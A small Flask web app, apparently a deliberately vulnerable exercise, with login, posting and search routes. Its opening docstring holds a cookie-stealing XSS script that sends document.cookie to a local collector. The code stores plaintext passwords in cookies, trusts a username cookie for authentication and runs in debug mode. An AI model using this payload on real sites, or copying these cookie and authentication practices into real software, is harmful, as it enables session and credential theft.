'''
<script>
var x = new XMLHttpRequest();
x.open('GET', 'http://localhost:1234/?'+document.cookie);
x.send();
</script>
'''
from flask import Flask,request,render_template, redirect, url_for, session, make_response
from db import dbHelper

app=Flask(__name__,static_url_path="")
posts = []
@app.route('/')
@app.route('/login')
def func():
    name = request.cookies.get('userID')
    if name is None:
        return render_template('login.html')
    return render_template('home.html', posts=posts)

def checkPass(user, password):
    users=[]
    with dbHelper() as db:
        users.extend(db.getId(user, password))
    if len(users)>0:
        return True
    return False
    '''
    users = [('timothy','1234'), ('akshay','abcd'), ('abinav','pass')]
    pair = (user,password)
    if pair in users:
        return True
    return False
    '''

@app.route('/home', methods=['POST'])
def login():
    if checkPass(request.form['username'], request.form['password']):
        resp = make_response(render_template('home.html', posts=posts))
        resp.set_cookie('userID', request.form['username'])
        resp.set_cookie('pass', request.form['password'])
        return resp
    else:
        return redirect('/')

@app.route('/logout')
def logout():
    resp = redirect('/')
    resp.set_cookie('userID', '', expires=0)
    resp.set_cookie('pass', '', expires=0)
    return resp

@app.route('/search', methods=['GET'])
def search():
    print(request.args['searchString'])
    return render_template('search.html', term=request.args['searchString'])

@app.route('/post', methods=['POST'])
def post():
    print(request.form['postString'])
    posts.append(request.form['postString'])
    return render_template('home.html', posts=posts)

if __name__ == '__main__':
    app.run("localhost", debug=True)
